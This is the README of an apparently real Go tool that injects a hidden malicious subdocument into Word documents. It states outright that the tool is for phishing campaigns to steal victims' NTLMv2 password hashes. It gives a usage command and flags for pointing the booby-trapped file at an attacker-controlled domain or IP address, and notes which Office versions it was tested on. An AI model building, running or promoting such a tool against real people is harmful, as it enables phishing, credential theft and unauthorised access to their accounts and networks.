# go-subdoc
A tool made in Go that injects a hidden malicious subdoc in a Word document.  
This comes in handy on phishing campaigns for stealing the NTLMv2 hash.

Tested on Microsoft Office 2016 and 2019. Not guarateed to work on the latest Microsoft Office 365 version.

## Usage
```
go-subdoc -input target.docx/docm -target example.com/127.0.0.1
```

```
  -input string
        Target document
  -target string
        Target server (only domain / ip address)
```

Please input only either a domain or an IP Address as the target. No UNC paths or locations.
